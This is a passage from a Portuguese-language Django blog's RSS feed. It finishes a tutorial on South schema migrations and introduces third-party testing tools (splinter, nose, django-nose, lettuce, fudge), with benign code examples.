criaremos a nossa primeira migration:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ python manage.py schemamigration blog --initial&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Vale notar que o comando acima não cria nenhuma tabela no banco de
dados. O que ele faz é criar um conjunto de instruções que representa
este modelo. Na medida que são feitas alterações no modelo, é necessário
gerar novas &lt;em&gt;migrations&lt;/em&gt;, que serão sempre baseados nas estruturas já
criadas.&lt;/p&gt;
&lt;p&gt;Por exemplo, vamos de fato criar a tabela &lt;em&gt;blog&lt;/em&gt; no banco de dados:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ python manage.py migrate blog

Running migrations for blog:
- blog:0001_initial
- Loading initial data for blog.
No fixtures found.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Se houvesse alguma &lt;em&gt;fixture&lt;/em&gt;, o &lt;em&gt;South&lt;/em&gt; faria o &lt;em&gt;insert&lt;/em&gt; das informações
para você.&lt;/p&gt;
&lt;p&gt;A primeira &lt;em&gt;migration&lt;/em&gt; foi criada. Como mencionado antes, a partir de
agora toda migration criada será baseada na &lt;em&gt;migration&lt;/em&gt; “anterior”
(podemos deduzir a ordem das &lt;em&gt;migrations&lt;/em&gt; através do prefixo numérico,
no caso acima, o &lt;code class=&quot;language-text&quot;&gt;0001&lt;/code&gt; indica que esta é a primeira).&lt;/p&gt;
&lt;p&gt;Vamos adicionar um campo no modelo (que equivale a uma coluna no banco
de dados), para ilustrar a criação de novas &lt;em&gt;migrations&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# blog/models.py&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Blog&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Model&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    titulo &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;CharField&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;Titulo&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; max_length&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    resumo &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;TextField&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;Resumo&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; blank&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; null&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    texto &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;TextField&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;Texto&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Não é mais necessário o uso do parâmetro &lt;code class=&quot;language-text&quot;&gt;-–initial&lt;/code&gt;, de agora em
diante precisaremos do parâmetro &lt;code class=&quot;language-text&quot;&gt;–-auto&lt;/code&gt; (que construirá a
&lt;em&gt;migration&lt;/em&gt; automaticamente, de acordo com a primeira já existente):&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ python manage.py schemamigration blog --auto

+ Added field resumo on blog.Blog
Created 0002_auto__add_field_blog_resumo.py. You can now apply this migration
with: ./manage.py migrate blog&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Pronto! Uma nova &lt;em&gt;migration&lt;/em&gt; foi criada… e com um nome bem intuitivo
(repare no prefixo numérico). Basta darmos a ordem de replicar estas
instruções no banco de dados:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ python manage.py migrate blog

Running migrations for blog:
- Migrating forwards to 0002_auto__add_field_blog_resumo.
- blog:0002_auto__add_field_blog_resumo
- Loading initial data for blog.
No fixtures found.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;A nova coluna foi inserida na tabela &lt;em&gt;blog&lt;/em&gt;, sem necessitar de nenhuma
intervenção manual. Se você ficou curioso para saber como essa “mágica”
acontece, basta abrir as &lt;em&gt;migrations&lt;/em&gt; e ver que são instruções escritas
em &lt;a href=&quot;/tag/python.html&quot; title=&quot;Leia mais sobre Python&quot;&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;, que interagem com o banco de dados “por trás” do &lt;em&gt;ORM&lt;/em&gt;
do &lt;em&gt;Django&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;South&lt;/em&gt; possui mais alguns recursos interessantes (como &lt;em&gt;data
migrations&lt;/em&gt;), que você pode conferir &lt;a href=&quot;http://south.aeracode.org/docs/tutorial/index.html&quot; title=&quot;Aprenda mais sobre o South&quot;&gt;neste tutorial&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://south.aeracode.org/&quot; title=&quot;Visite a página oficial do projeto South&quot;&gt;&lt;em&gt;South – Intelligent schema and data migrations for Django&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[Ferramentas de testes em Django - Parte 2]]></title><description><![CDATA[No post anterior,
conhecemos as ferramentas default para construção de testes
automatizados em Django. Acontece que você pode “sair um pouco da
caixa” e usufruir de ferramentas “third-party“, que enriquecerão o seu
ambiente de desenvolvimento e lhe trarão maior segurança em seus testes
de software…]]></description><link>https://klauslaube.com.br/2011/07/23/ferramentas-de-testes-em-django-parte-2.html</link><guid isPermaLink="false">https://klauslaube.com.br/2011/07/23/ferramentas-de-testes-em-django-parte-2.html</guid><dc:creator><![CDATA[Klaus Peter Laube]]></dc:creator><pubDate>Sat, 23 Jul 2011 18:00:00 GMT</pubDate><content:encoded>&lt;p&gt;No &lt;a href=&quot;/2011/07/18/ferramentas-de-testes-em-django-parte-1.html&quot; title=&quot;Ferramentas de testes em Django - Parte 1&quot;&gt;&lt;em&gt;post&lt;/em&gt; anterior&lt;/a&gt;,
conhecemos as ferramentas &lt;em&gt;default&lt;/em&gt; para construção de testes
automatizados em &lt;a href=&quot;/tag/django.html&quot; title=&quot;Leia mais sobre Django&quot;&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;. Acontece que você pode “sair um pouco da
caixa” e usufruir de ferramentas “third-party“, que enriquecerão o seu
ambiente de desenvolvimento e lhe trarão maior segurança em seus &lt;a href=&quot;/tag/testes.html&quot; title=&quot;Leia mais sobre testes&quot;&gt;testes
de &lt;em&gt;software&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;splinter – Testando a sua aplicação com um navegador&lt;/h2&gt;
&lt;p&gt;É perfeitamente possível criar testes de aceitação em &lt;em&gt;Django&lt;/em&gt; com a
&lt;a href=&quot;https://docs.djangoproject.com/en/dev/topics/testing/#module-django.test.client&quot; title=&quot;Testando aplicações web com test client em Django&quot;&gt;&lt;em&gt;TestClient&lt;/em&gt;&lt;/a&gt; e &lt;a href=&quot;http://lxml.de/&quot; title=&quot;Faça parser XML e HTML com lxml&quot;&gt;&lt;em&gt;lxml&lt;/em&gt;&lt;/a&gt;. Mas vamos ser sinceros, é deveras
trabalhoso “parsear” os resultados das suas &lt;em&gt;views&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Com a &lt;a href=&quot;http://splinter.cobrateam.info/&quot; title=&quot;Visite a documentação oficial da Splinter&quot;&gt;&lt;em&gt;Splinter&lt;/em&gt;&lt;/a&gt;, uma ferramenta para testes de aplicações
&lt;a href=&quot;/tag/desenvolvimento-web.html&quot; title=&quot;Leia mais sobre Web&quot;&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;, você pode automatizar ações executadas por navegadores, como
visitar uma página, preencher um formulário ou clicar em um &lt;em&gt;link&lt;/em&gt;; tudo
isso sem preocupar-se com &lt;em&gt;parsing&lt;/em&gt;, nós, &lt;em&gt;DOM&lt;/em&gt;, nem nada do tipo:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; splinter&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;browser
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; Browser

browser &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; Browser&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;# Visitar uma URL&lt;/span&gt;
url &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;http://search.twitter.com&quot;&lt;/span&gt;
browser&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;visit&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;url&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
browser&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;fill&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;q&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;#cobrateam&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;# Procurar e clicar no botão &apos;search&apos;&lt;/span&gt;
button &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; browser&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;find_by_css&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;#searchButton input&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first

&lt;span class=&quot;token comment&quot;&gt;# Interagir com os elementos&lt;/span&gt;
button&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;click&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; browser&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;is_text_present&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;No results for #cobrateam&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;nobody likes us =(&quot;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;we&apos;re popular =)&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;O que eu acho mais bacana nesta ferramenta são os seletores, facilitam
muito na hora de checar resultados e comportamentos.&lt;/p&gt;
&lt;p&gt;A comunidade em volta desta ferramenta está em constante crescimento e
atividade. Portanto, caso você queira contribuir com o projeto, vá agora
mesmo para o &lt;a href=&quot;https://github.com/cobrateam/splinter&quot; title=&quot;Repositório da Splinter no GitHub&quot;&gt;repositório no &lt;em&gt;GitHub&lt;/em&gt; e colabore&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;nose – Caçando testes em seu projeto (Python)&lt;/h2&gt;
&lt;p&gt;E quando queremos fugir da regra? Aposto que chegará um momento em que a
estrutura de diretórios padrão, necessária para a execução dos seus
testes em &lt;em&gt;Django&lt;/em&gt;, não te satisfará mais. O que fazer neste caso?
Simples, recorra ao &lt;em&gt;Nose&lt;/em&gt;!&lt;/p&gt;
&lt;p&gt;O &lt;a href=&quot;http://somethingaboutorange.com/mrl/projects/nose/1.0.0/&quot; title=&quot;Nose - is nicer testing for Python&quot;&gt;&lt;em&gt;Nose&lt;/em&gt;&lt;/a&gt; estende os recursos da &lt;em&gt;unittest&lt;/em&gt; e facilita a escrita
e carregamento dos testes em projetos &lt;a href=&quot;/tag/python.html&quot; title=&quot;Leia mais sobre Python&quot;&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;. De uma forma mais
detalhada, ele percorre o seu projeto (ou uma determinada região de seu
escolha) executando subclasses da &lt;code class=&quot;language-text&quot;&gt;unittest.TestCase&lt;/code&gt; ou funções que
contenham “test”. Por exemplo:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# test_subclasse.py&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; unittest

&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;SubclasseTest&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;unittest&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;TestCase&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;test_um_eh_verdadeiro&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        self&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;assertTrue&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;# test_funcao.py&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;test_zero_eh_falso&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;False&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ao executar o comando &lt;strong&gt;nosetests&lt;/strong&gt; o &lt;em&gt;nose&lt;/em&gt; se encarregará de procurar
e carregar os testes:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ nosetests
..
----------------------------------------------------------------------
Ran 2 tests in 0.005s

OK&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;É claro que existe uma “mágica” aí. Na verdade o &lt;em&gt;nose&lt;/em&gt; pesquisará por
&lt;strong&gt;arquivos&lt;/strong&gt; &lt;em&gt;Python&lt;/em&gt; com “test” em seu nome, por &lt;strong&gt;funções&lt;/strong&gt; com “test”
em seu enunciado, e por &lt;strong&gt;classes&lt;/strong&gt; com métodos “test” em sua
declaração. Ele age mesmo como um “runner“, tendo a capacidade de lidar
com testes escritos com &lt;em&gt;unittest&lt;/em&gt; ou não.&lt;/p&gt;
&lt;p&gt;Essa é só a ponta do &lt;em&gt;iceberg&lt;/em&gt;. É possível construir &lt;em&gt;plugins&lt;/em&gt; para o
&lt;em&gt;nose&lt;/em&gt;, permitindo melhorar ainda mais o seu ambiente de testes (como
por exemplo, permitir que o &lt;a href=&quot;http://pypi.python.org/pypi/nosepipe/&quot; title=&quot;Conheça o nosepipe&quot;&gt;&lt;em&gt;nose&lt;/em&gt; funcione em &lt;em&gt;subprocess&lt;/em&gt;
separados&lt;/a&gt;).&lt;/p&gt;
&lt;h3&gt;Caçando testes em seu projeto (Django)&lt;/h3&gt;
&lt;p&gt;Para facilitar ainda mais a escrita de testes em &lt;em&gt;Django&lt;/em&gt; existem
&lt;em&gt;plugins&lt;/em&gt; como o &lt;a href=&quot;http://pypi.python.org/pypi/django-nose&quot; title=&quot;Utilize o nose em seus projetos Django&quot;&gt;&lt;em&gt;django-nose&lt;/em&gt;&lt;/a&gt;, que permite que você substitua o
&lt;em&gt;Test Runner&lt;/em&gt; padrão da &lt;em&gt;framework&lt;/em&gt; por um específico que utiliza o
&lt;em&gt;nose&lt;/em&gt;, unindo assim a facilidade e “add-ons” do &lt;em&gt;nose&lt;/em&gt; com o ambiente
de testes do &lt;em&gt;Django&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;lettuce – BDD em Django&lt;/h2&gt;
&lt;p&gt;E se você estava se perguntando sobre &lt;a href=&quot;/tag/bdd.html&quot; title=&quot;Leia mais sobre BDD&quot;&gt;&lt;em&gt;BDD&lt;/em&gt;&lt;/a&gt; em &lt;em&gt;Django&lt;/em&gt;, eu
apresento a &lt;a href=&quot;http://lettuce.it/intro/overview.html#intro-overview&quot; title=&quot;Saiba mais sobre a lettuce&quot;&gt;&lt;em&gt;Lettuce&lt;/em&gt;&lt;/a&gt;!&lt;/p&gt;
&lt;p&gt;Esta ferramenta, baseada na &lt;a href=&quot;http://cukes.info/&quot; title=&quot;Cucumber - Making BDD fun&quot;&gt;&lt;em&gt;Cucumber&lt;/em&gt;&lt;/a&gt;, permite com que você escreva
histórias utilizando linguagem ubíqua, mais próxima da área de negócios
do que da área técnica, e automatize a validação delas.&lt;/p&gt;
&lt;p&gt;O mais bacana é que ela já vem preparada para o &lt;em&gt;Django&lt;/em&gt;, permitindo que
a gente execute os testes de comportamento de forma fácil e rápida:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;gherkin&quot;&gt;&lt;pre class=&quot;language-gherkin&quot;&gt;&lt;code class=&quot;language-gherkin&quot;&gt;&lt;span class=&quot;token feature&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;Feature:&lt;/span&gt;&lt;span class=&quot;token important&quot;&gt; Rocking with lettuce and django&lt;/span&gt;

&lt;/span&gt;    &lt;span class=&quot;token scenario&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;Scenario:&lt;/span&gt;&lt;span class=&quot;token important&quot;&gt; Simple Hello World&lt;/span&gt;&lt;/span&gt;
        &lt;span class=&quot;token atrule&quot;&gt;Given&lt;/span&gt; &lt;span class=&quot;token atrule&quot;&gt;I&lt;/span&gt; access the url &lt;span class=&quot;token string&quot;&gt;&quot;/&quot;&lt;/span&gt;
        &lt;span class=&quot;token atrule&quot;&gt;Then&lt;/span&gt; &lt;span class=&quot;token atrule&quot;&gt;I&lt;/span&gt; see the header &lt;span class=&quot;token string&quot;&gt;&quot;Hello World&quot;&lt;/span&gt;

    &lt;span class=&quot;token scenario&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;Scenario:&lt;/span&gt;&lt;span class=&quot;token important&quot;&gt; Hello + capitalized name&lt;/span&gt;&lt;/span&gt;
        &lt;span class=&quot;token atrule&quot;&gt;Given&lt;/span&gt; &lt;span class=&quot;token atrule&quot;&gt;I&lt;/span&gt; access the url &lt;span class=&quot;token string&quot;&gt;&quot;/some-name&quot;&lt;/span&gt;
        &lt;span class=&quot;token atrule&quot;&gt;Then&lt;/span&gt; &lt;span class=&quot;token atrule&quot;&gt;I&lt;/span&gt; see the header &lt;span class=&quot;token string&quot;&gt;&quot;Hello Some Name&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;História escrita, vamos escrever o &lt;em&gt;script&lt;/em&gt; &lt;em&gt;Python&lt;/em&gt; que validará se está
tudo de acordo:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; lettuce &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; lxml &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; html
&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; django&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;test&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;client &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; Client

&lt;span class=&quot;token decorator annotation punctuation&quot;&gt;@before&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;all&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;set_browser&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    world&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;browser &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; Client&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;token decorator annotation punctuation&quot;&gt;@step&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;r&apos;I access the url &quot;(.*)&quot;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;access_url&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;step&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; url&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    response &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; world&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;browser&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;get&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;url&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    world&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;dom &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; html&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;fromstring&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;response&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;content&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;token decorator annotation punctuation&quot;&gt;@step&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;r&apos;I see the header &quot;(.*)&quot;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;see_header&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;step&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; text&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    header &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; world&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;dom&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cssselect&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;h1&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;assert&lt;/span&gt; header&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;text &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; text&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Basta executá-lo da seguinte maneira:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ python manage.py harvest&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;a href=&quot;http://lettuce.it/recipes/django-lxml.html#recipes-django-lxml&quot; title=&quot;Django + Lettuce, uma dupla interessante!&quot;&gt;Confira mais informações sobre como utilizar o &lt;em&gt;lettuce&lt;/em&gt; com &lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;fudge – Ajude o Python a mentir&lt;/h2&gt;
&lt;p&gt;O &lt;a href=&quot;http://farmdev.com/projects/fudge/&quot; title=&quot;Fudge, criando objetos mentirosos&quot;&gt;&lt;em&gt;Fudge&lt;/em&gt;&lt;/a&gt; é um módulo &lt;em&gt;Python&lt;/em&gt; que auxilia na construção de
objetos “dublês” (&lt;a href=&quot;http://www.infoq.com/br/articles/mocks-Arent-Stubs&quot; title=&quot;Mocks não são Stubs&quot;&gt;&lt;em&gt;mocks&lt;/em&gt; e &lt;em&gt;stubs&lt;/em&gt;&lt;/a&gt;), que permitem escrever testes
sem necessariamente possuir um serviço ativo ou um objeto construído.&lt;/p&gt;
&lt;p&gt;Um caso comum: Você está construindo uma &lt;em&gt;API&lt;/em&gt; que autentica via &lt;em&gt;OAuth&lt;/em&gt;
ao &lt;em&gt;Twitter&lt;/em&gt; e está utilizando testes para guiar o seu desenvolvimento.
Não é interessante que nossos testes sejam dependentes da
disponibilidade do serviço do &lt;em&gt;Twitter&lt;/em&gt;, portanto, escrevemos um “objeto
mentiroso”, que simulará este serviço, aceitando uma entrada e gerando
um saída:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; fudge

&lt;span class=&quot;token decorator annotation punctuation&quot;&gt;@fudge&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;patch&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;oauthtwitter.OAuthApi&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
